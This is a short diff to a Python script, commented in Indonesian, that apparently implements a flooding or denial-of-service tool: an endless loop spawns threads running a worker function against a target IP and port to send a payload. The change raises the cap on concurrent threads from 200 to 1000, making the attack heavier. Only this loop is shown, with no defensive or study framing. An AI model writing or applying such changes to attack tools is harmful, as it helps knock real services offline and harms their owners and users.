@@ -53,6 +53,6 @@ def worker(target_ip, target_port):
 
 # Memulai proses threading untuk mengirimkan payload melalui banyak thread
 while True:
-    while threading.active_count() >= 200:  # Batasi jumlah thread aktif
+    while threading.active_count() >= 1000:  # Batasi jumlah thread aktif
         pass
     threading.Thread(target=worker, args=(target_ip, target_port)).start()
